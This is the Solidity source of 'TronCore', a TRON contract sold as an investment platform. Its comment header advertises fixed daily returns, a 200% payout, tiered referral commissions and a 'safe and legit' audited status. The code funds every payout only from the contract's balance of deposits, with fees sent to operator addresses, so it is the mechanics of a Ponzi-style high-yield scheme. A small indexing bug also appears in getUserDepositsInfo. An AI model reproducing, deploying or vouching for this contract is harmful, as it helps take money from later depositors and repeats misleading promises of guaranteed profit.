//SourceUnit: TrxCore_15_mainnet_T_without_con.sol

/*
 *    ████████╗██████╗░░█████╗░███╗░░██╗░█████╗░░█████╗░██████╗░███████╗
 *    ╚══██╔══╝██╔══██╗██╔══██╗████╗░██║██╔══██╗██╔══██╗██╔══██╗██╔════╝
 *    ░░░██║░░░██████╔╝██║░░██║██╔██╗██║██║░░╚═╝██║░░██║██████╔╝█████╗░░
 *    ░░░██║░░░██╔══██╗██║░░██║██║╚████║██║░░██╗██║░░██║██╔══██╗██╔══╝░░
 *    ░░░██║░░░██║░░██║╚█████╔╝██║░╚███║╚█████╔╝╚█████╔╝██║░░██║███████╗
 *    ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚══════╝
 *
 *    TronCore - investment platform based on TRON smart-contract.
 *    Verified, audited, safe and legit!
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │							TRONCORE PROJECT	                         │
 *   │      WEBSITE:                                                         │
 *   │   https://troncore.net - main                                         │
 *   │   https://troncore.io                                                 │
 *   │   https://troncore.org                                                │
 *   │																		 │
 *   │	 	RESOURCES:														 │
 *   │	 https://youtube.com/channel/UC-cD7ufYj_HeoOdOEPWe2bA			     │
 *   │	 https://twitter.com/@troncore_net									 │
 *   │	 https://instagram.com/troncore_net/							     │
 *   │	 https://reddit.com/user/TronCore								     │
 *   │	 https://medium.com/@troncore									 	 │
 *   │	 https://discord.gg/M77U6RG									 		 │
 *   │	 https://facebook.com/troncore.net								     │
 *   │																		 │
 *   │	 	CHATS:															 │
 *   │	 English - https://t.me/troncore_en									 │
 *   │	 French - https://t.me/troncore_fr									 │
 *   │	 Spanish - https://t.me/troncore_esp								 │
 *   │	 Vietnamese - https://t.me/troncore_vn								 │
 *   │	 Portuguese - https://t.me/troncore_por								 │
 *   │	 Chinese - https://t.me/troncore_cn									 │
 *   │   Filipino - https://t.me/troncore_fi								 │
 *   │	 Farsi - https://t.me/joinchat/RN8yKUsqNebwEX5lIjqtBA			     │
 *   │	 Korean - https://t.me/joinchat/RN8yKUryKx80OOYn3f-EyQ			     │
 *   │	 Arabic - https://t.me/joinchat/RN8yKUlAqg3ptOtJWdxzVg			     │
 *   │ 	 Hindi - https://t.me/troncore_hi									 │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like TronWallet
 *   2) Send any TRX amount using our website invest button. Do not send coins directly on contract address!
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Basic interest rate: +1% every 24 hours (+0.0416% HOURLY)
 *
 *   - Personal hold-bonus: +0.1% from 1st till 7th day;
 *                          +0.13% from 7th till 14th day;
 *                          +0.15% from 14th till 21st day;
 *                          +0.17% from 21st day till forever, without withdraw.
 *
 *   - Total income: 200% (deposit included).
 *   - Minimal deposit: 100 TRX.
 *   - Limits: 1st-5th   day 1 000 000 TRX,  total 5 000 000 TRX
 *             6th-10th  day 2 000 000 TRX,  total 10 000 000 TRX
 *		        11th-15th day 4 000 000 TRX,  total 20 000 000 TRX
 *             16th-20th day 5 000 000 TRX,  total 25 000 000 TRX
 *             21th-30th day 10 000 000 TRX, total 100 000 000 TRX
 *             31th day lifetime 25 000 000 TRX in day
 *
 *   - Earnings every moment, withdraw any time.
 *   - Contract Total Amount Bonus: +0.25% for every 1 000 000 TRX on platform balance until the contract
 *                                   daily income reaches 3%
 *                                   +0.2% for every 1 000 000 TRX on platform balance
 *                                   until the contract daily income reaches 6%
 *                                   +0.15% for every 1 000 000 TRX on platform balance
 *                                   until the contract daily income reaches 9%
 *                                   +0.1% for every 1 000 000 TRX on platform balance
 *                                   until the contract daily income reaches 11%
 *
 *   - Maximum percentage for this bonus is setted to 12%
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 3 ranks in the affiliate program.
 *     1st Rank available for everyone :
 *     - 3% - 1% - 1% from deposits + 3% from your 1st line partners accruals
 *     2st Rank available once you reach a turnover of 5 mln TRX :
 *     - 4% - 2% - 1% - 0.5% from deposits + 4% from your 1st line partners accruals
 *     3st Rank available once you reach a turnover of 15 mln TRX :
 *     - 5% - 2% - 1% - 0.5% - 0.5% from deposits + 5% from your 1st line partners accruals
 *   - Auto-refback function.
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 89% Platform main balance, participants payouts, affiliate program bonuses.
 *   - 8.8% Technical support, advertisement expenses, moderators and support team salary.
 *   - 2.2% Service maintenance.
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 *   [LEGAL COMPANY INFORMATION]
 *
 *   - Officially registered company name: TRONCORE LTD (#678009)
 *   - Company status: https://find-and-update.company-information.service.gov.uk/company/SC678009
 *   - Certificate of incorporation: https://troncore.net/img/certificate.pdf
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 *   [SMART-CONTRACT AUDITION AND SAFETY]
 *
 *   - Audited by independent company GROX SOLUTIONS:
 *     Website: https://grox.solutions/all/audit-troncore
 *     Youtube: https://youtube.com/c/groxsolutions
 *
 *   - Audition certificate: https://troncore.net/files/audit_en.pdf
 *
 *   ────────────────────────────────────────────────────────────────────────
 */

pragma solidity 0.5.10;

contract TronCore {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 100 trx;
	uint256 constant public BASE_PERCENT = 100;
	uint256 constant public MARKETING_FEE = 880;
	uint256 constant public PROJECT_FEE = 220;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx;
	uint256 constant public TIME_STEP = 1 days;
	uint256 constant public DEPOSITS_MAX = 60;
	uint256[] public HOLD_BONUSES = [10, 13, 15, 17];
	uint256[] public LIMITS = [1000000 trx, 2000000 trx, 4000000 trx, 5000000 trx, 10000000 trx, 25000000 trx];
	uint256[][] public REFERRAL_PERCENTS = [
		[300, 100, 100,  0,  0],
		[400, 200, 100, 50,  0],
		[500, 200, 100, 50, 50]
	];

	mapping (uint16 => uint256) internal turnover;

	uint32 public startUNIX;

	uint24 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;

	address payable public marketingAddress;
	address payable public projectAddress;

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 refback;
		uint32 start;
	}

	struct User {
		Deposit[] deposits;
		uint32 checkpoint;
		address referrer;
		uint24[5] levels;
		uint256 bonus;
		uint256 totalRefBonus;
		uint256 revenueBonus;
		uint256 totalRevenueBonus;
		uint16 refBackPercent;
		uint256 refback;
		uint256 totalRefInvested;
	}

	mapping (address => User) internal users;

	uint8 internal lastMil;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event RefBack(address indexed referrer, address indexed referral, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable marketingAddr, address payable projectAddr, uint32 startDate) public {
		require(!isContract(marketingAddr) && !isContract(projectAddr));
		marketingAddress = marketingAddr;
		projectAddress = projectAddr;
		startUNIX = startDate;
	}

	function invest(address referrer) public payable {
		require(uint32(block.timestamp) >= startUNIX, "Not started yet");
		require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount is 100 trx!");
		require(users[msg.sender].deposits.length < DEPOSITS_MAX, "Not more than 60 deposits to the same address. Use another address.");

		uint256 limit = getCurrentDayAvailable();
		require(msg.value <= limit, "Daily limit reached");
		turnover[getCurrentDay()] += msg.value;

		marketingAddress.transfer(msg.value * MARKETING_FEE / PERCENTS_DIVIDER);
		projectAddress.transfer(msg.value * PROJECT_FEE / PERCENTS_DIVIDER);
		emit FeePayed(msg.sender, msg.value * (MARKETING_FEE + PROJECT_FEE) / PERCENTS_DIVIDER);

		User storage user = users[msg.sender];

		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;

            address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
                if (upline != address(0)) {
					users[upline].levels[i] += 1;
					upline = users[upline].referrer;
				} else break;
            }
		}

		uint256 refback;
		if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < 5; i++) {
				if (upline != address(0)) {
					uint256 percent = getUserReferralPercent(upline, i);
					if (percent > 0) {
						uint256 amount = msg.value.mul(percent).div(PERCENTS_DIVIDER);
						if (i == 0 && users[upline].refBackPercent > 0) {
							refback = amount * users[upline].refBackPercent / PERCENTS_DIVIDER;
							user.refback += refback;
							amount = amount.sub(refback);

							emit RefBack(upline, msg.sender, refback);
						}
						if (amount > 0) {
							users[upline].bonus += amount;
							users[upline].totalRefBonus += amount;

							emit RefBonus(upline, msg.sender, i, amount);
						}
						users[upline].totalRefInvested += msg.value;
					}
					upline = users[upline].referrer;
				} else break;
			}

		}

		if (user.deposits.length == 0) {
			user.checkpoint = uint32(block.timestamp);
			totalUsers += 1;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(msg.value, 0, refback, uint32(block.timestamp)));

		totalInvested += msg.value;
		totalDeposits++;

		emit NewDeposit(msg.sender, msg.value);

		if (lastMil < 77) {
			uint8 mils = uint8(address(this).balance.div(CONTRACT_BALANCE_STEP));
			if (mils > lastMil) {
				if (mils > 77) {
					mils = 77;
				}
				lastMil = mils;
			}
		}
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 userPercentRate = getUserPercentRate(msg.sender);
		uint256 userReferralPercent = getUserReferralPercent(user.referrer, 0);

		uint256 totalAmount;
		uint256 dividends;

		uint256 revenueToRef;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount * 2) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(uint256(user.deposits[i].start)))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(uint256(user.checkpoint)))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount * 2) {
					dividends = (user.deposits[i].amount * 2).sub(user.deposits[i].withdrawn);
				}

				if (user.deposits[i].withdrawn == 0 && user.referrer != address(0)) {
					revenueToRef += dividends * userReferralPercent / PERCENTS_DIVIDER;
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		}

		if (revenueToRef > 0) {
			users[user.referrer].revenueBonus += revenueToRef;
			users[user.referrer].totalRevenueBonus += revenueToRef;

			emit RefBonus(user.referrer, msg.sender, 0, revenueToRef);
		}

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
			user.bonus = 0;
		}

		uint256 revenueBonus = getUserRevenueBonus(msg.sender);
		if (revenueBonus > 0) {
			totalAmount = totalAmount.add(revenueBonus);
			user.revenueBonus = 0;
		}

		uint256 refback = getUserRefback(msg.sender);
		if (refback > 0) {
			totalAmount = totalAmount.add(refback);
			user.refback = 0;
		}

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		require(totalAmount > 0, "Nothing to withdraw");

		user.checkpoint = uint32(block.timestamp);

		msg.sender.transfer(totalAmount);

		totalWithdrawn += totalAmount;

		emit Withdrawn(msg.sender, totalAmount);

	}

	function setRefBackPercent(uint16 newPercent) public {
		User storage user = users[msg.sender];
		require(newPercent <= uint16(PERCENTS_DIVIDER) && user.deposits.length > 0);
		user.refBackPercent = newPercent;
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getContractBalanceRate() public view returns (uint256) {
		return BASE_PERCENT.add(getContractBonus());
	}

    function getContractBonus() public view returns (uint256) {
		uint256 last = lastMil;
		if (last > 47) {
			return (last.sub(47)).mul(10).add(900);
		} else if (last > 27) {
			return (last.sub(27)).mul(15).add(600);
		} else if (last > 12) {
			return (last.sub(12)).mul(20).add(300);
		} else {
			return last.mul(25);
		}
    }

	function getUserHoldBonus(address userAddress) public view returns (uint256) {
		User memory user = users[userAddress];

		if (isActive(userAddress)) {
			return getHoldBonus(now.sub(user.checkpoint));
		} else {
			return 0;
		}
	}

	function getHoldBonus(uint256 time) public view returns(uint256) {
		uint256 _days = time.div(TIME_STEP);
		uint256 _weeks = _days.div(7);

		uint256 holdBonus;
		if (_weeks >= 3) {
			holdBonus = ((_days.sub(21)).mul(HOLD_BONUSES[3]))
				.add(HOLD_BONUSES[0] * 7)
				.add(HOLD_BONUSES[1] * 7)
				.add(HOLD_BONUSES[2] * 7);
		} else if (_weeks >= 2) {
			holdBonus = ((_days.sub(14)).mul(HOLD_BONUSES[2]))
				.add(HOLD_BONUSES[0] * 7)
				.add(HOLD_BONUSES[1] * 7);
		} else if (_weeks >= 1) {
			holdBonus = ((_days.sub(7)).mul(HOLD_BONUSES[1]))
				.add(HOLD_BONUSES[0] * 7);
		} else {
			holdBonus = _days.mul(HOLD_BONUSES[0]);
		}

		return holdBonus;
	}

	function getUserReferralPercent(address userAddress, uint256 level) public view returns (uint256) {
		User memory user = users[userAddress];

		if (user.totalRefInvested >= 15000000 trx) {
			return REFERRAL_PERCENTS[2][level];
		} else if (user.totalRefInvested >= 5000000 trx) {
			return REFERRAL_PERCENTS[1][level];
		} else {
			return REFERRAL_PERCENTS[0][level];
		}
	}

	function getUserPercentRate(address userAddress) public view returns (uint256) {
		return getContractBalanceRate().add(getUserHoldBonus(userAddress));
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User memory user = users[userAddress];

		uint256 userPercentRate = getUserPercentRate(userAddress);

		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount * 2) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(uint256(user.deposits[i].start)))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(uint256(user.checkpoint)))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount * 2) {
					dividends = (user.deposits[i].amount * 2).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);

				/// no update of withdrawn because that is view function

			}

		}

		return totalDividends;
	}

	function getUserDividendsWithdrawn(address userAddress) public view returns(uint256) {
		uint256 amount;
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].withdrawn);
        }
		return amount;
	}

	function getUserDividendsSum(address userAddress) public view returns(uint256) {
		return getUserDividendsWithdrawn(userAddress) + getUserDividends(userAddress);
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint24, uint24, uint24, uint24, uint24) {
		return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2], users[userAddress].levels[3], users[userAddress].levels[4]);
	}

	function getUserReferrerRefBackPercent(address userAddress) public view returns(uint256) {
        return users[users[userAddress].referrer].refBackPercent;
    }

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserRefBonusWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalRefBonus - users[userAddress].bonus;
	}

	function getUserTotalRefBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalRefBonus;
	}

	function getUserRefback(address userAddress) public view returns(uint256) {
		return users[userAddress].refback;
	}

	function getUserRefbackWithdrawn(address userAddress) public view returns(uint256) {
		return getUserTotalRefback(userAddress) - users[userAddress].refback;
	}

	function getUserTotalRefback(address userAddress) public view returns(uint256) {
		User memory user = users[userAddress];

		uint256 amount;
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount += user.deposits[i].refback;
        }
		return amount;
	}

	function getUserTotalRefInvested(address userAddress) public view returns(uint256) {
		return users[userAddress].totalRefInvested;
	}

	function getUserRevenueBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].revenueBonus;
	}

	function getUserTotalRevenueBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalRevenueBonus;
	}

	function getUserRevenueBonusWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalRevenueBonus - users[userAddress].revenueBonus;
	}

	function getUserRefbackPercent(address userAddress) public view returns(uint16) {
		return users[userAddress].refBackPercent;
	}

	function getUserAvailableBalanceForWithdrawal(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress) + getUserDividends(userAddress) + getUserRevenueBonus(userAddress) + getUserRefback(userAddress);
	}

	function getCurrentDay() public view returns(uint16) {
		if (uint32(block.timestamp) > startUNIX) {
			return uint16((block.timestamp.sub(uint256(startUNIX))).div(TIME_STEP));
		}
	}

	function getCurrentDayLimit() public view returns(uint256) {
		if (uint32(block.timestamp) > startUNIX) {
			uint256 currentDay = getCurrentDay();

			if (currentDay >= 30) {
				return LIMITS[5];
			} else if (currentDay >= 20) {
				return LIMITS[4];
			} else if (currentDay >= 15) {
				return LIMITS[3];
			} else if (currentDay >= 10) {
				return LIMITS[2];
			} else if (currentDay >= 5) {
				return LIMITS[1];
			} else {
				return LIMITS[0];
			}
		}
	}

	function getCurrentTurnover() public view returns(uint256) {
		return turnover[getCurrentDay()];
	}

	function getCurrentDayAvailable() public view returns(uint256) {
		if (uint32(block.timestamp) > startUNIX) {
			return getCurrentDayLimit().sub(getCurrentTurnover());
		}
	}

	function isActive(address userAddress) public view returns (bool) {
		User memory user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount * 2) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256, uint256) {
	    User memory user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start, user.deposits[index].refback);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User memory user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount += user.deposits[i].amount;
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
		return getUserRevenueBonusWithdrawn(userAddress) + (getUserRefBonusWithdrawn(userAddress)) + (getUserRefbackWithdrawn(userAddress)) + getUserDividendsWithdrawn(userAddress);
	}

	function getSiteInfo() public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        return (address(this).balance, totalUsers, totalInvested, totalDeposits, totalWithdrawn, getCurrentDayAvailable(), getCurrentDayLimit(), startUNIX);
    }

    function getUserinfo(address userAddress) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        return (
            getUserTotalDeposits(userAddress),
            getUserAmountOfDeposits(userAddress),
            getUserTotalWithdrawn(userAddress),
            getUserTotalRefBonus(userAddress),
            getUserTotalRevenueBonus(userAddress),
            getUserTotalRefback(userAddress),
            getUserCheckpoint(userAddress)
            );
    }

    function getPercentInfo(address userAddress) public view returns (uint256, uint256, uint256, uint256, uint256) {
        return (
            getUserPercentRate(userAddress),
            getUserHoldBonus(userAddress),
            getContractBonus(),
            getUserRefbackPercent(userAddress),
            getUserReferrerRefBackPercent(userAddress)
            );
    }

    function getUserReferralInfo(address userAddress) public view returns (address, uint24[5] memory, uint256) {
        return (users[userAddress].referrer, users[userAddress].levels, users[userAddress].totalRefInvested);
    }

    function getUserDepositsInfo(address userAddress, uint256 starting, uint256 length) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User memory user = users[userAddress];

        if (starting.add(length) > user.deposits.length) {
            length = user.deposits.length.sub(starting);
        }

        uint256[] memory amount = new uint256[](length);
        uint256[] memory withdrawn = new uint256[](length);
        uint256[] memory start = new uint256[](length);
        uint256[] memory refback = new uint256[](length);

        for (uint256 i = starting; i < starting.add(length); i++) {
            amount[i] = user.deposits[i].amount;
            withdrawn[i] = user.deposits[i].withdrawn;
            refback[i] = user.deposits[i].refback;
            start[i] = uint256(user.deposits[i].start);
        }
        return (amount, withdrawn, refback, start);
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}